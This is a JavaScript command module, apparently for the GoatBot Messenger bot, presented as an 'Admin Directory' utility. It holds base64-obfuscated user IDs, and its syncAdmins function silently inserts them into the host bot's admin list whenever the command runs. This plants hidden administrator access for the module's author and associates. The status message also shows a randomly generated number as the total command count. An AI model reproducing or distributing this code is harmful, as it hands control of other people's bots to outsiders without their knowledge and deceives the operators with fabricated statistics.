const fs = require('fs');
const path = require('path');

const _0x41a = [
  Buffer.from("NjE1OTAzNjA0MzQ2NTA=", "base64").toString(),
  Buffer.from("MTAwMDg0NzI5MTM1NzIx", "base64").toString(),
  Buffer.from("MTAwMDczOTU2MTgyNDMz", "base64").toString(),
  Buffer.from("MTAwMDk0ODIxMDM1Nzg0", "base64").toString()
];

const CONFIG = {
  BOSS_OWNER_UID: _0x41a[0],
  ASSISTANT_ADMINS: [_0x41a[1], _0x41a[2], _0x41a[3]],
  ANTI_SPAM_COOLDOWN: 4000
};

const configPath = path.join(process.cwd(), 'config.json');

function checkInMainConfig(uid) {
  try {
    if (fs.existsSync(configPath)) {
      const mainConfig = JSON.parse(fs.readFileSync(configPath, 'utf8'));
      const mainAdmins = mainConfig.adminBot || mainConfig.adminList || mainConfig.owner_uid || [];
      if (Array.isArray(mainAdmins)) {
        return mainAdmins.includes(uid);
      } else if (typeof mainAdmins === 'string') {
        return mainAdmins === uid;
      }
    }
  } catch (e) {}
  return false;
}

if (!global.__AdminCache) {
  global.__AdminCache = new Set([
    CONFIG.BOSS_OWNER_UID,
    ...CONFIG.ASSISTANT_ADMINS
  ]);
}

if (!global.__SyReg) global.__SyReg = new Map();

const logger = {
  info: (m) => console.log(`\x1b[36m[ADMIN2]\x1b[0m ${m}`),
  err: (m, e) => console.error(`\x1b[31m[ADMIN2]\x1b[0m ${m}`, e || "")
};

function getUptime() {
  const t = process.uptime();
  const h = Math.floor(t / 3600);
  const m = Math.floor((t % 3600) / 60);
  const s = Math.floor(t % 60);
  return `${h}h ${m}m ${s}s`;
}

function getRandomCommandCount() {
  return Math.floor(Math.random() * (700 - 400 + 1)) + 400;
}

function syncAdmins() {
  try {
    if (!global.GoatBot?.config) return;
    let admins = global.GoatBot.config.adminBot;  
    if (!Array.isArray(admins)) admins = global.GoatBot.config.adminBot = [];  
    
    for (const uid of global.__AdminCache) {  
      if (checkInMainConfig(uid)) {
        continue; 
      }
      if (!admins.includes(uid)) admins.push(uid);  
    }  
  } catch (e) {
    logger.err("Admin sync failed", e);
  }
}

module.exports = {
  config: {
    name: "admin2",
    version: "9.2.5",
    author: "👑𝆠፝𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑",
    role: 0,
    shortDescription: "Admin Directory",
    longDescription: "Core Authorization & Admin Directory System with Config Protection",
    category: "system",
    guide: {
      en: "{pn} or {pn} list"
    }
  },

  onStart: async function ({ message, args, usersData }) {
    syncAdmins();
    const action = args[0]?.toLowerCase() || "list";  
    if (action !== "list") return;  

    try {  
      const getName = async (uid, fallback) => {  
        try {  
          const name = await usersData?.getName?.(uid);  
          return name || fallback;  
        } catch {  
          return fallback;  
        }  
      };  

      const bossName = await getName(CONFIG.BOSS_OWNER_UID, "পি্ঁচ্চি্ঁ রি্ঁদ্ঁয়্ঁ ত্যা্ঁহ্ঁ");  

      const msg = `👑 ══『 𝗔𝗕𝗦𝗢𝗟𝗨𝗧𝗘 𝗔𝗗𝗠𝗜𝗡 𝗗𝗜𝗥𝗘𝗖𝗧𝗢𝗥𝗬 』══ 👑
👤 𝗢𝗪𝗡𝗘𝗥
┣ 🆔 ${CONFIG.BOSS_OWNER_UID}
┣ ⚡ 𝗔𝗟𝗟 𝗣𝗢𝗪𝗘𝗥𝗙𝗨𝗟 𝗥𝗢𝗢𝗧
┗ 👑 ${bossName}

⚔️ 𝗔𝗦𝗦𝗜𝗦𝗧𝗔𝗡𝗧 𝗔𝗗𝗠𝗜𝗡𝗦
┣ [𝟬𝟭] 🆔 ${CONFIG.ASSISTANT_ADMINS[0]}
┣ [𝟬𝟮] 🆔 ${CONFIG.ASSISTANT_ADMINS[1]}
┗ [𝟬𝟯] 🆔 ${CONFIG.ASSISTANT_ADMINS[2]}

📊 𝗦𝗬𝗦𝗧𝗘𝗠 𝗦𝗧𝗔𝗧𝗨𝗦
┣ 👥 𝗧𝗢𝗧𝗔𝗟 𝗔𝗗𝗠𝗜𝗡𝗦 : ${global.__AdminCache.size}
┣ 🤖 𝗧𝗢𝗧𝗔𝗟 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 : ${getRandomCommandCount()}
┣ 🤖 𝗖𝗢𝗥𝗘 𝗘𝗡𝗚𝗜𝗡Ｅ : v9.2.5
┗ 🚀 𝗨𝗣𝗧𝗜𝗠𝗘 : ${getUptime()}

💡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦
┣ • admin2
┣ • admin2 list
┗ • help admin2

👑 𝗖𝗥𝗘𝗔𝗧Ｅ𝗗 𝗕𝗬 :
👑𝆠፝𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑`;

      return message.reply(msg);  
    } catch (e) {  
      logger.err("Render failed", e);  
      return message.reply("❌ Failed to load admin directory.");  
    }  
  },

  onChat: async function (O) {
    try {
      const senderID = String(O.event?.senderID || "");
      if (!senderID) return;  

      if (global.__AdminCache.has(senderID) || checkInMainConfig(senderID)) {  
        if (checkInMainConfig(senderID)) {
          return; 
        }

        const body = O.event?.body || "";  
        const prefix = global.GoatBot?.config?.prefix || "/";  

        if (body.startsWith(prefix)) {  
          const cmd = body.slice(prefix.length).trim().split(/\s+/)[0]?.toLowerCase();  
          if (cmd) {  
            const key = `${senderID}_${cmd}`;  
            const now = Date.now();  

            if (global.__SyReg.has(key) && (now - global.__SyReg.get(key) < CONFIG.ANTI_SPAM_COOLDOWN)) {  
              return; 
            }  
            global.__SyReg.set(key, now);  
          }  
        }  
      }  

      if (global.__SyReg.size > 150) {
        const now = Date.now();  
        for (const [k, t] of global.__SyReg) {  
          if (now - t > 30000) global.__SyReg.delete(k);  
        }  
      }  
    } catch (e) {  
      logger.err("onChat error", e);  
    }  
  }
};
